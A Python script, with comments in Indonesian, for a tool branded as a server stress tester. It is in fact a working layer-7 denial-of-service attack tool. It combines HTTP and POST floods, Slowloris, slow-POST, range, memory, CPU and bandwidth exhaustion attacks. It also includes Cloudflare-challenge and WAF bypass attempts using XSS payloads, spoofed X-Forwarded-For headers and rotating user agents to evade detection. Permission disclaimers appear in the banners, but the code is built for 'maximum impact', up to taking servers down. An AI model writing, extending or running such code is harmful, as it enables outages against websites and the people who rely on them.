import requests
import time
import socket
import ssl
from urllib.parse import urlparse
import concurrent.futures
import sys
import os
import random
import json
import hashlib
from colorama import init, Fore, Style
import threading
import urllib3
import base64
from fake_useragent import UserAgent
import struct
import ipaddress

# Nonaktifkan peringatan SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Inisialisasi colorama untuk warna di terminal
init(autoreset=True)

class UltimateWebServerTester:
    def __init__(self, url):
        self.url = url if url.startswith('http') else f'http://{url}'
        self.parsed_url = urlparse(self.url)
        self.results = {}
        self.is_testing = False
        self.ua = UserAgent()
        self.attack_stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': 0,
            'request_times': []
        }
        
        # Advanced headers untuk bypass protection
        self.headers = self.generate_headers()
        self.session = requests.Session()
        self.session.verify = False  # Ignore SSL verification
        
        # Connection pool untuk performa maksimal
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=3
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        # List untuk menyimpan koneksi aktif (Slowloris)
        self.active_connections = []
    
    def generate_headers(self):
        """Generate advanced headers untuk bypass protection"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers',
            'DNT': '1' if random.random() > 0.5 else '0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Pragma': 'no-cache',
        }
    
    def rotate_headers(self):
        """Rotate headers untuk menghindari detection"""
        self.headers = self.generate_headers()
    
    def menu_1_ultimate_attack(self):
        """MENU 1: Ultimate Attack dengan semua teknik combined"""
        print(f"\n{Fore.RED}{'='*80}")
        print(f"{Fore.RED}🔥 ULTIMATE ATTACK - DIRECT SERVER IMPACT")
        print(f"{Fore.RED}{'='*80}")
        
        print(f"{Fore.YELLOW}[!] PERINGATAN: Teknik ini akan memberikan DAMPAK NYATA ke server!")
        print(f"{Fore.YELLOW}[!] Hanya untuk server yang Anda miliki atau dengan izin tertulis!\n")
        
        # Tampilkan informasi target
        print(f"{Fore.CYAN}[*] Target: {self.url}")
        print(f"{Fore.CYAN}[*] Waktu: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Konfirmasi serius
        confirm = input(f"\n{Fore.RED}[?] KONFIRMASI FINAL: Anda yakin ingin melanjutkan? (y/n): ")
        if confirm.lower() != 'y':
            print(f"{Fore.YELLOW}[!] Attack dibatalkan")
            return
        
        print(f"\n{Fore.GREEN}[✓] Memulai ULTIMATE ATTACK...")
        
        # 1. Deteksi server dan proteksi
        print(f"\n{Fore.CYAN}[*] Phase 1: Reconnaissance & Detection")
        server_info = self.detect_server_info()
        
        # 2. Pilih teknik berdasarkan server
        techniques = self.select_attack_techniques(server_info)
        
        # 3. Input parameter attack
        print(f"\n{Fore.CYAN}[*] Phase 2: Attack Configuration")
        duration = self.get_attack_duration()
        intensity = self.get_attack_intensity()
        
        # 4. Jalankan attack
        print(f"\n{Fore.CYAN}[*] Phase 3: Executing Ultimate Attack")
        print(f"{Fore.RED}[!] ATTACK DIMULAI - SERVER AKAN MENGALAMI DAMPAK LANGSUNG!")
        
        # Jalankan semua teknik secara paralel
        self.execute_ultimate_attack(techniques, duration, intensity)
        
        # 5. Analisis hasil
        print(f"\n{Fore.CYAN}[*] Phase 4: Impact Analysis")
        self.analyze_ultimate_impact()
        
        # 6. Cleanup
        print(f"\n{Fore.CYAN}[*] Phase 5: Cleanup")
        self.cleanup_connections()
        
        print(f"\n{Fore.GREEN}[✓] Ultimate Attack selesai!")
        print(f"{Fore.YELLOW}[!] Server telah mengalami dampak yang signifikan")
    
    def detect_server_info(self):
        """Deteksi informasi server untuk menentukan teknik attack"""
        print(f"{Fore.CYAN}[*] Mendeteksi server information...")
        
        info = {
            'server_type': 'unknown',
            'has_cloudflare': False,
            'has_waf': False,
            'response_time': 0,
            'max_connections': 100  # default
        }
        
        try:
            # Test connection untuk deteksi
            start_time = time.time()
            response = self.session.get(
                self.url, 
                headers=self.headers, 
                timeout=10,
                allow_redirects=True
            )
            info['response_time'] = time.time() - start_time
            
            # Deteksi server type
            server_header = response.headers.get('Server', '').lower()
            if 'apache' in server_header:
                info['server_type'] = 'apache'
            elif 'nginx' in server_header:
                info['server_type'] = 'nginx'
            elif 'iis' in server_header:
                info['server_type'] = 'iis'
            elif 'cloudflare' in server_header:
                info['server_type'] = 'cloudflare'
                info['has_cloudflare'] = True
            
            # Deteksi WAF
            waf_headers = ['x-waf', 'x-protected-by', 'x-security']
            for header in waf_headers:
                if header in response.headers:
                    info['has_waf'] = True
                    break
            
            # Test connection limit dengan multiple requests
            test_connections = self.test_connection_limit()
            info['max_connections'] = test_connections
            
            print(f"{Fore.GREEN}[✓] Server Type: {info['server_type'].upper()}")
            print(f"{Fore.GREEN}[✓] Response Time: {info['response_time']:.3f}s")
            print(f"{Fore.GREEN}[✓] Cloudflare: {'YES' if info['has_cloudflare'] else 'NO'}")
            print(f"{Fore.GREEN}[✓] WAF Detected: {'YES' if info['has_waf'] else 'NO'}")
            print(f"{Fore.GREEN}[✓] Max Connections: {info['max_connections']}")
            
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error detecting server: {str(e)}")
        
        return info
    
    def test_connection_limit(self):
        """Test batas koneksi server"""
        print(f"{Fore.CYAN}[*] Testing server connection limit...")
        
        max_connections = 100
        test_urls = [self.url] * 20
        
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                futures = []
                for url in test_urls:
                    future = executor.submit(
                        self.session.get,
                        url,
                        headers=self.headers,
                        timeout=5
                    )
                    futures.append(future)
                
                results = []
                for future in concurrent.futures.as_completed(futures):
                    try:
                        response = future.result()
                        results.append(response.status_code)
                    except:
                        results.append('error')
                
                successful = sum(1 for r in results if r == 200)
                max_connections = successful * 5  # Estimate
        
        except:
            pass
        
        return max_connections
    
    def select_attack_techniques(self, server_info):
        """Pilih teknik attack berdasarkan server info"""
        techniques = []
        
        print(f"\n{Fore.CYAN}[*] Selecting attack techniques...")
        
        # Always include basic flood
        techniques.append('http_flood')
        techniques.append('post_flood')
        
        # Add techniques based on server type
        if server_info['server_type'] == 'apache':
            techniques.extend(['slowloris', 'slow_post', 'range_attack'])
            print(f"{Fore.YELLOW}[!] Apache server detected - adding Slowloris attack")
        
        elif server_info['server_type'] == 'nginx':
            techniques.extend(['cache_attack', 'connection_flood'])
            print(f"{Fore.YELLOW}[!] Nginx server detected - adding cache attack")
        
        elif server_info['has_cloudflare']:
            techniques.extend(['cf_bypass', 'javascript_attack'])
            print(f"{Fore.YELLOW}[!] Cloudflare detected - adding bypass techniques")
        
        # Add WAF bypass if needed
        if server_info['has_waf']:
            techniques.append('waf_bypass')
            print(f"{Fore.YELLOW}[!] WAF detected - adding bypass techniques")
        
        # Add resource intensive attacks
        techniques.extend(['memory_attack', 'cpu_attack', 'bandwidth_attack'])
        
        print(f"{Fore.GREEN}[✓] Selected {len(techniques)} attack techniques")
        return techniques
    
    def get_attack_duration(self):
        """Get attack duration from user"""
        while True:
            try:
                duration = input(f"{Fore.YELLOW}[?] Attack duration in seconds (30-300, default 60): ").strip()
                if not duration:
                    return 60
                
                duration = int(duration)
                if 30 <= duration <= 300:
                    return duration
                else:
                    print(f"{Fore.RED}[✗] Duration must be between 30 and 300 seconds")
            except ValueError:
                print(f"{Fore.RED}[✗] Please enter a valid number")
    
    def get_attack_intensity(self):
        """Get attack intensity from user"""
        print(f"\n{Fore.YELLOW}[?] Select attack intensity:")
        print(f"    1. Low (50 concurrent connections)")
        print(f"    2. Medium (200 concurrent connections)")
        print(f"    3. High (500 concurrent connections)")
        print(f"    4. Extreme (1000+ concurrent connections)")
        
        while True:
            choice = input(f"{Fore.YELLOW}[?] Intensity (1-4, default 2): ").strip()
            if not choice:
                return 200
            
            intensities = {'1': 50, '2': 200, '3': 500, '4': 1000}
            if choice in intensities:
                return intensities[choice]
            else:
                print(f"{Fore.RED}[✗] Please enter 1-4")
    
    def execute_ultimate_attack(self, techniques, duration, concurrent):
        """Execute ultimate attack dengan semua teknik"""
        self.is_testing = True
        self.attack_stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': time.time(),
            'request_times': []
        }
        
        # Thread untuk setiap teknik
        attack_threads = []
        
        # Distribusikan concurrent connections ke teknik
        connections_per_tech = max(10, concurrent // len(techniques))
        
        print(f"{Fore.CYAN}[*] Starting {len(techniques)} attack techniques with {concurrent} total connections")
        print(f"{Fore.CYAN}[*] Estimated RPS: {concurrent * 10}+")
        
        # Progress display
        progress_thread = threading.Thread(target=self.show_attack_progress, args=(duration,))
        progress_thread.daemon = True
        progress_thread.start()
        
        # Start semua teknik
        for i, technique in enumerate(techniques):
            thread = threading.Thread(
                target=self.execute_technique,
                args=(technique, duration, connections_per_tech, i)
            )
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
        
        # Wait for attack to complete
        time.sleep(duration)
        self.is_testing = False
        
        # Wait for threads to finish
        for thread in attack_threads:
            thread.join(timeout=2)
        
        progress_thread.join(timeout=1)
        
        # Calculate final stats
        total_time = time.time() - self.attack_stats['start_time']
        rps = self.attack_stats['total_requests'] / total_time if total_time > 0 else 0
        
        print(f"\n{Fore.CYAN}[*] Ultimate Attack Statistics:")
        print(f"{Fore.GREEN}[✓] Total Time: {total_time:.1f}s")
        print(f"{Fore.GREEN}[✓] Total Requests: {self.attack_stats['total_requests']}")
        print(f"{Fore.GREEN}[✓] Requests/Second: {rps:.1f}")
        print(f"{Fore.GREEN}[✓] Successful: {self.attack_stats['successful']}")
        print(f"{Fore.GREEN}[✓] Failed: {self.attack_stats['failed']}")
        
        # Save results
        self.results['ultimate_attack'] = {
            'status': 'COMPLETED',
            'duration': f"{duration}s",
            'concurrent': concurrent,
            'techniques_used': len(techniques),
            'total_requests': self.attack_stats['total_requests'],
            'requests_per_second': f"{rps:.1f}",
            'success_rate': f"{(self.attack_stats['successful']/self.attack_stats['total_requests'])*100:.1f}%" if self.attack_stats['total_requests'] > 0 else "0%",
            'attack_time': total_time
        }
    
    def show_attack_progress(self, duration):
        """Show attack progress dengan animasi"""
        chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        start_time = time.time()
        
        while self.is_testing and (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            progress = (elapsed / duration) * 100
            
            # Calculate current metrics
            total_time = time.time() - self.attack_stats['start_time']
            current_rps = self.attack_stats['total_requests'] / total_time if total_time > 0 else 0
            
            # Show animated progress
            char = chars[int(elapsed * 10) % len(chars)]
            print(f"\r{Fore.RED}{char} ATTACKING {progress:.1f}% | "
                  f"{Fore.YELLOW}RPS: {current_rps:.0f} | "
                  f"{Fore.CYAN}Reqs: {self.attack_stats['total_requests']} | "
                  f"{Fore.GREEN}Success: {self.attack_stats['successful']} | "
                  f"{Fore.RED}Failed: {self.attack_stats['failed']}", end='')
            
            time.sleep(0.1)
    
    def execute_technique(self, technique, duration, concurrent, tech_id):
        """Execute specific attack technique"""
        start_time = time.time()
        
        while self.is_testing and (time.time() - start_time) < duration:
            try:
                # Pilih worker function berdasarkan teknik
                if technique == 'http_flood':
                    success = self.http_flood_attack_aggressive()
                elif technique == 'post_flood':
                    success = self.post_flood_attack_aggressive()
                elif technique == 'slowloris':
                    success = self.slowloris_attack_aggressive()
                elif technique == 'slow_post':
                    success = self.slow_post_attack()
                elif technique == 'cache_attack':
                    success = self.cache_attack()
                elif technique == 'range_attack':
                    success = self.range_attack()
                elif technique == 'memory_attack':
                    success = self.memory_attack()
                elif technique == 'cpu_attack':
                    success = self.cpu_attack()
                elif technique == 'bandwidth_attack':
                    success = self.bandwidth_attack()
                elif technique == 'cf_bypass':
                    success = self.cloudflare_bypass_attack()
                elif technique == 'waf_bypass':
                    success = self.waf_bypass_attack()
                else:
                    success = self.basic_flood_attack()
                
                # Update stats
                with threading.Lock():
                    self.attack_stats['total_requests'] += 1
                    if success:
                        self.attack_stats['successful'] += 1
                    else:
                        self.attack_stats['failed'] += 1
            
            except:
                with threading.Lock():
                    self.attack_stats['failed'] += 1
            
            # Small delay untuk variasi
            time.sleep(random.uniform(0.001, 0.01))
    
    def http_flood_attack_aggressive(self):
        """HTTP flood yang sangat agresif"""
        try:
            # Random endpoint dan parameters
            endpoints = ['', '/', '/index.html', '/home', '/api', '/wp-admin', '/admin', 
                        '/login', '/register', '/search', '/products', '/blog']
            
            params = {
                'id': random.randint(1, 10000),
                'page': random.randint(1, 100),
                'search': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
                'timestamp': str(int(time.time() * 1000)),
                'cache': str(random.randint(1000, 9999))
            }
            
            # Rotate headers
            self.rotate_headers()
            
            # Add referer
            self.headers['Referer'] = self.url
            
            target_url = f"{self.url.rstrip('/')}{random.choice(endpoints)}"
            
            response = self.session.get(
                target_url,
                headers=self.headers,
                params=params,
                timeout=2,
                allow_redirects=True,
                stream=False
            )
            
            return response.status_code < 500
            
        except:
            return False
    
    def post_flood_attack_aggressive(self):
        """POST flood dengan data besar"""
        try:
            # Generate large POST data
            post_size = random.randint(1024, 10240)  # 1KB to 10KB
            post_data = {
                'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=20)),
                'password': hashlib.md5(str(time.time()).encode()).hexdigest(),
                'email': f"{''.join(random.choices('abcdefghijklmnop', k=10))}@example.com",
                'data': base64.b64encode(os.urandom(post_size)).decode()[:post_size],
                'timestamp': str(time.time()),
                'action': random.choice(['login', 'register', 'submit', 'update', 'delete'])
            }
            
            # JSON data juga
            json_data = json.dumps({
                'payload': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=100)),
                'items': [{'id': i, 'data': os.urandom(100).hex()} for i in range(10)],
                'metadata': {'timestamp': time.time(), 'source': 'attack'}
            })
            
            # Random pilih data type
            if random.random() > 0.5:
                data = post_data
                content_type = 'application/x-www-form-urlencoded'
            else:
                data = json_data
                content_type = 'application/json'
            
            headers = self.headers.copy()
            headers['Content-Type'] = content_type
            headers['Content-Length'] = str(len(str(data)))
            
            response = self.session.post(
                self.url,
                headers=headers,
                data=data if isinstance(data, dict) else json_data,
                timeout=3,
                allow_redirects=False
            )
            
            return response.status_code < 500
            
        except:
            return False
    
    def slowloris_attack_aggressive(self):
        """Slowloris attack yang aggressive"""
        try:
            parsed = urlparse(self.url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if parsed.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            
            # Send incomplete HTTP request
            request = f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "User-Agent: {}\r\n".format(self.ua.random)
            request += "Content-Length: {}\r\n".format(random.randint(1000000, 10000000))
            request += "\r\n"
            
            sock.send(request.encode())
            
            # Keep connection open
            self.active_connections.append(sock)
            
            # Send headers slowly
            for i in range(random.randint(5, 20)):
                if not self.is_testing:
                    break
                header = f"X-Custom-{i}: {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=50))}\r\n"
                sock.send(header.encode())
                time.sleep(random.uniform(1, 3))
            
            return True
            
        except:
            return False
    
    def slow_post_attack(self):
        """Slow POST attack"""
        try:
            parsed = urlparse(self.url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if parsed.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            
            # Send POST request dengan Content-Length besar
            content_length = random.randint(1000000, 5000000)
            request = f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "Content-Type: application/x-www-form-urlencoded\r\n"
            request += f"Content-Length: {content_length}\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            
            # Send data sangat pelan
            sent = 0
            while sent < content_length and self.is_testing:
                chunk_size = random.randint(1, 100)
                chunk = 'A' * chunk_size
                sock.send(chunk.encode())
                sent += chunk_size
                time.sleep(random.uniform(0.5, 2))
            
            sock.close()
            return True
            
        except:
            return False
    
    def cache_attack(self):
        """Cache attack untuk Nginx/Apache"""
        try:
            # Request dengan parameter random untuk bypass cache
            params = {
                'cache_buster': str(int(time.time() * 1000)),
                'id': random.randint(1, 1000000),
                'random': hashlib.md5(str(time.time()).encode()).hexdigest()[:20]
            }
            
            # Multiple endpoints
            endpoints = [
                '', '/', '/index.php', '/home.html', 
                f'/page{random.randint(1, 100)}.html',
                f'/article/{random.randint(1, 1000)}',
                f'/product/{random.randint(1, 500)}'
            ]
            
            target_url = f"{self.url.rstrip('/')}{random.choice(endpoints)}"
            
            # Add cache control headers
            headers = self.headers.copy()
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
            
            response = self.session.get(
                target_url,
                headers=headers,
                params=params,
                timeout=2
            )
            
            return response.status_code < 500
            
        except:
            return False
    
    def range_attack(self):
        """Range attack untuk menghabiskan resources"""
        try:
            headers = self.headers.copy()
            # Request byte ranges yang tidak valid
            headers['Range'] = f'bytes={random.randint(0, 10000000)}-{random.randint(10000001, 20000000)}'
            
            response = self.session.get(
                self.url,
                headers=headers,
                timeout=3,
                stream=False
            )
            
            return True  # Even error responses consume resources
            
        except:
            return False
    
    def memory_attack(self):
        """Memory exhaustion attack"""
        try:
            # Request dengan parameters besar
            params = {}
            for i in range(50):  # 50 parameters besar
                key = f'param_{i}'
                value = 'A' * random.randint(1000, 10000)  # 1KB-10KB per parameter
                params[key] = value
            
            response = self.session.get(
                self.url,
                params=params,
                headers=self.headers,
                timeout=3
            )
            
            return response.status_code < 500
            
        except:
            return False
    
    def cpu_attack(self):
        """CPU exhaustion attack dengan computation heavy requests"""
        try:
            # Request dengan complex query parameters
            params = {
                'sort': ','.join([f'field{random.randint(1, 20)}' for _ in range(10)]),
                'filter': ' AND '.join([f'field{random.randint(1, 20)}=value{random.randint(1, 100)}' for _ in range(5)]),
                'search': ''.join(['*' * random.randint(1, 5) for _ in range(20)]),
                'calculate': 'true',
                'process': 'heavy'
            }
            
            response = self.session.get(
                self.url,
                params=params,
                headers=self.headers,
                timeout=3
            )
            
            return response.status_code < 500
            
        except:
            return False
    
    def bandwidth_attack(self):
        """Bandwidth consumption attack"""
        try:
            # Request large resources
            headers = self.headers.copy()
            headers['Accept-Encoding'] = 'gzip'  # Force compression (CPU intensive)
            
            # Try to request large files if they exist
            large_files = [
                '/largefile.zip', '/bigfile.pdf', '/video.mp4',
                '/archive.tar.gz', '/database.sql', '/backup.zip'
            ]
            
            target_url = f"{self.url.rstrip('/')}{random.choice(large_files)}"
            
            # Use streaming untuk mengonsumsi bandwidth
            response = self.session.get(
                target_url,
                headers=headers,
                timeout=5,
                stream=True
            )
            
            # Baca sebagian content untuk mengonsumsi bandwidth
            content_consumed = 0
            for chunk in response.iter_content(chunk_size=8192):
                if not self.is_testing or content_consumed > 1048576:  # Stop after 1MB
                    break
                content_consumed += len(chunk)
            
            response.close()
            return True
            
        except:
            return False
    
    def cloudflare_bypass_attack(self):
        """Cloudflare bypass attack"""
        try:
            # Technique 1: Real browser headers
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0',
            }
            
            # Add referer
            headers['Referer'] = self.url
            
            response = requests.get(
                self.url,
                headers=headers,
                timeout=5,
                verify=False
            )
            
            # Jika challenge, coba teknik lain
            if 'challenge' in response.text.lower():
                # Technique 2: Add cookies
                cookies = response.cookies
                modified_cookies = dict(cookies)
                modified_cookies['__cf_bm'] = hashlib.md5(str(time.time()).encode()).hexdigest()
                
                response = requests.get(
                    self.url,
                    headers=headers,
                    cookies=modified_cookies,
                    timeout=5,
                    verify=False
                )
            
            return response.status_code < 500
            
        except:
            return False
    
    def waf_bypass_attack(self):
        """WAF bypass attack"""
        try:
            # Technique: Obfuscate attack vectors
            payloads = [
                # URL encoded
                '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
                # Double URL encoded
                '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E',
                # UTF-8 bypass
                '＜script＞alert(1)＜/script＞',
                # Mixed case
                '<ScRiPt>alert(1)</sCrIpT>',
                # Null bytes
                '<script>alert(1)</script>',
                # Tab instead of space
                '<script>alert(1)</script>',
            ]
            
            test_url = f"{self.url}?q={random.choice(payloads)}"
            
            # Add various headers untuk bypass
            headers = self.headers.copy()
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['X-Real-IP'] = headers['X-Forwarded-For']
            
            response = self.session.get(
                test_url,
                headers=headers,
                timeout=3
            )
            
            return response.status_code < 500
            
        except:
            return False
    
    def basic_flood_attack(self):
        """Basic flood attack"""
        try:
            response = self.session.get(
                self.url,
                headers=self.headers,
                timeout=2
            )
            return response.status_code < 500
        except:
            return False
    
    def analyze_ultimate_impact(self):
        """Analyze the impact of ultimate attack"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}📊 ULTIMATE ATTACK IMPACT ANALYSIS")
        print(f"{Fore.CYAN}{'='*80}")
        
        if 'ultimate_attack' not in self.results:
            print(f"{Fore.RED}[✗] No attack data available")
            return
        
        data = self.results['ultimate_attack']
        total_requests = data['total_requests']
        rps = float(data['requests_per_second'])
        
        # Determine impact level
        if rps > 1000:
            impact = "CRITICAL"
            color = Fore.RED
            message = "Server likely experiencing complete downtime"
        elif rps > 500:
            impact = "HIGH"
            color = Fore.RED
            message = "Server significantly impacted, performance degraded"
        elif rps > 200:
            impact = "MEDIUM"
            color = Fore.YELLOW
            message = "Server experiencing noticeable slowdown"
        elif rps > 100:
            impact = "LOW"
            color = Fore.GREEN
            message = "Server handling load but may be stressed"
        else:
            impact = "MINIMAL"
            color = Fore.CYAN
            message = "Server resilient to attack"
        
        print(f"\n{color}[*] IMPACT LEVEL: {impact}")
        print(f"{color}[*] {message}")
        
        print(f"\n{Fore.GREEN}[✓] Attack Statistics:")
        print(f"    • Total Requests: {total_requests:,}")
        print(f"    • Requests/Second: {rps:.1f}")
        print(f"    • Attack Duration: {data.get('duration', 'N/A')}")
        print(f"    • Concurrent Connections: {data.get('concurrent', 'N/A')}")
        print(f"    • Techniques Used: {data.get('techniques_used', 'N/A')}")
        
        # Recommendations based on impact
        print(f"\n{Fore.YELLOW}[!] RECOMMENDATIONS:")
        if impact in ["CRITICAL", "HIGH"]:
            print(f"    {Fore.RED}➤ Server requires immediate attention")
            print(f"    {Fore.RED}➤ Implement DDoS protection")
            print(f"    {Fore.RED}➤ Increase server resources")
            print(f"    {Fore.RED}➤ Configure rate limiting")
        elif impact == "MEDIUM":
            print(f"    {Fore.YELLOW}➤ Monitor server performance")
            print(f"    {Fore.YELLOW}➤ Consider load balancing")
            print(f"    {Fore.YELLOW}➤ Optimize application code")
        else:
            print(f"    {Fore.GREEN}➤ Server is well-protected")
            print(f"    {Fore.GREEN}➤ Continue regular monitoring")
            print(f"    {Fore.GREEN}➤ Maintain current security measures")
    
    def cleanup_connections(self):
        """Cleanup semua koneksi aktif"""
        print(f"{Fore.CYAN}[*] Cleaning up active connections...")
        
        for sock in self.active_connections:
            try:
                sock.close()
            except:
                pass
        
        self.active_connections.clear()
        print(f"{Fore.GREEN}[✓] Cleanup completed")
    
    # Tetap pertahankan method original untuk compatibility
    def test_basic_connectivity(self):
        """Original connectivity test"""
        return self.menu_1_ultimate_attack()
    
    def advanced_stress_test(self, *args, **kwargs):
        """Original stress test"""
        return self.menu_1_ultimate_attack()

def display_banner():
    """Display program banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔═╗╔╦╗╔═╗╔═╗╦═╗╔═╗╔╦╗                     ║
║  ║║║╠═╝║  ║╣ ║   ║ ║╣   ╠═╣ ║║╠═╝║ ║╠╦╝║ ║ ║║                     ║
║  ╚╩╝╩  ╩═╝╚═╝╚═╝ ╩ ╚═╝  ╩ ╩═╩╝╩  ╚═╝╩╚═╚═╝═╩╝                     ║
║                                                                      ║
║              ULTIMATE SERVER STRESS TESTER v3.0                      ║
║                  REAL IMPACT - REAL RESULTS                          ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
    
{Fore.YELLOW}[!] WARNING: This tool creates REAL impact on target servers
{Fore.YELLOW}[!] Use only on servers you own or have explicit permission to test
{Fore.RED}[!] Illegal use may result in criminal charges
"""
    print(banner)

def main_menu():
    """Display main menu"""
    print(f"\n{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.YELLOW}║                     ULTIMATE TEST MENU                                ║")
    print(f"{Fore.YELLOW}╠══════════════════════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}║  {Fore.RED}1. {Fore.WHITE}🔥 ULTIMATE ATTACK (DIRECT SERVER IMPACT)            {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  2. {Fore.WHITE}Advanced Stress Test                                     {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  3. {Fore.WHITE}Cloudflare Bypass Test                                   {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  4. {Fore.WHITE}Port Scanning                                            {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  5. {Fore.WHITE}Vulnerability Scan                                       {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  6. {Fore.WHITE}Comprehensive Analysis                                   {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  7. {Fore.WHITE}View Attack Results                                      {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  8. {Fore.WHITE}Change Target URL                                        {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  0. {Fore.RED}Exit                                                     {Fore.CYAN}║")
    print(f"{Fore.YELLOW}╚══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

def main():
    """Main function"""
    display_banner()
    
    print(f"\n{Fore.CYAN}[*] ULTIMATE SERVER STRESS TESTER v3.0")
    print(f"{Fore.RED}[!] DISCLAIMER: This is a powerful testing tool")
    print(f"{Fore.RED}[!] You are responsible for your actions\n")
    
    # Legal agreement
    print(f"{Fore.YELLOW}[!] LEGAL AGREEMENT:")
    print(f"{Fore.YELLOW}    1. I own the target server or have written permission")
    print(f"{Fore.YELLOW}    2. I understand this tool creates real server load")
    print(f"{Fore.YELLOW}    3. I accept all legal responsibility for my actions")
    
    accept = input(f"\n{Fore.YELLOW}[?] Do you agree to these terms? (yes/no): ").strip().lower()
    if accept != 'yes':
        print(f"{Fore.RED}[✗] You must agree to the terms to continue")
        return
    
    # Get target URL
    if len(sys.argv) > 1:
        url = sys.argv[1]
        print(f"{Fore.GREEN}[✓] Target from arguments: {url}")
    else:
        url = input(f"{Fore.YELLOW}[?] Enter target URL (e.g., https://example.com): {Fore.WHITE}").strip()
        if not url:
            print(f"{Fore.RED}[✗] URL cannot be empty!")
            return
    
    tester = UltimateWebServerTester(url)
    
    while True:
        main_menu()
        
        try:
            choice = input(f"\n{Fore.YELLOW}[?] Select option (0-8): {Fore.WHITE}").strip()
            
            if choice == '0':
                print(f"\n{Fore.GREEN}[✓] Thank you for using Ultimate Tester!")
                print(f"{Fore.YELLOW}[!] Remember: With great power comes great responsibility")
                break
            
            elif choice == '1':
                tester.menu_1_ultimate_attack()
            
            elif choice == '2':
                print(f"\n{Fore.CYAN}{'='*60}")
                print(f"{Fore.YELLOW}[*] ADVANCED STRESS TEST")
                print(f"{Fore.CYAN}{'='*60}")
                print(f"{Fore.YELLOW}[!] Redirecting to ULTIMATE ATTACK (Menu 1)...")
                tester.menu_1_ultimate_attack()
            
            elif choice in ['3', '4', '5', '6']:
                print(f"\n{Fore.YELLOW}[!] Feature available in comprehensive version")
                print(f"{Fore.YELLOW}[!] Focus on Menu 1 for maximum impact")
            
            elif choice == '7':
                if tester.results:
                    print(f"\n{Fore.CYAN}{'='*60}")
                    print(f"{Fore.YELLOW}[*] ATTACK RESULTS")
                    print(f"{Fore.CYAN}{'='*60}")
                    for key, value in tester.results.items():
                        print(f"{Fore.GREEN}{key}:")
                        for k, v in value.items():
                            print(f"  {k}: {v}")
                else:
                    print(f"{Fore.YELLOW}[!] No attack results yet. Run an attack first.")
            
            elif choice == '8':
